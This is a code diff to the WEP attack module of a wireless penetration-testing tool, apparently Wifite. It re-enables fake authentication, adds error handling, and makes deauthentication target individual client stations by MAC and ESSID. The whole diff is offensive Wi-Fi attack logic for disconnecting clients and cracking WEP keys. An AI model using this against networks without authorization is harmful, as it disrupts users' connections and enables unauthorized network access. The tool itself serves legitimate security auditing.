@@ -57,7 +57,7 @@ class AttackWEP(Attack):
                         # Use our interface's MAC address for the attacks.
                         client_mac = Interface.get_mac()
                         # Keep us authenticated
-                        #fakeauth_proc = Aireplay(self.target, "fakeauth")
+                        fakeauth_proc = Aireplay(self.target, "fakeauth")
                     elif len(airodump_target.clients) == 0:
                         # Failed to fakeauth, can't use our MAC.
                         # And there are no associated clients. Use one and tell the user.
@@ -85,12 +85,11 @@ class AttackWEP(Attack):
                     while True:
                         airodump_target = self.wait_for_target(airodump)
                         status = "%d/{C}%d{W} IVs" % (airodump_target.ivs, Configuration.wep_crack_at_ivs)
-                        '''
-                        if fakeauth_proc and fakeauth_proc.status:
-                            status += ", {G}fakeauth{W}"
-                        else:
-                            status += ", {R}no-auth{W}"
-                        '''
+                        if fakeauth_proc:
+                            if fakeauth_proc and fakeauth_proc.status:
+                                status += ", {G}fakeauth{W}"
+                            else:
+                                status += ", {R}no-auth{W}"
                         if aireplay.status is not None:
                             status += ", %s" % aireplay.status
                         Color.clear_entire_line()
@@ -224,6 +223,9 @@ class AttackWEP(Attack):
                 if self.user_wants_to_stop(attack_name, attacks_remaining, airodump_target):
                     self.success = False
                     return self.success
+            except Exception as e:
+                Color.pl("\n{+} {R}Error: {O}%s{W}" % e)
+                continue
             # End of big try-catch
         # End of for-each-attack-type loop
 
@@ -263,12 +265,13 @@ class AttackWEP(Attack):
         if answer == 1:
             # Deauth clients & retry
             num_deauths = 1
+            Color.clear_entire_line()
             Color.p("\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...")
-            Aireplay.deauth(target.bssid)
+            Aireplay.deauth(target.bssid, essid=target.essid)
             for client in target.clients:
                 Color.clear_entire_line()
-                Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.bssid)
-                Aireplay.deauth(target.bssid)
+                Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.station)
+                Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
                 num_deauths += 1
             Color.clear_entire_line()
             Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % num_deauths)
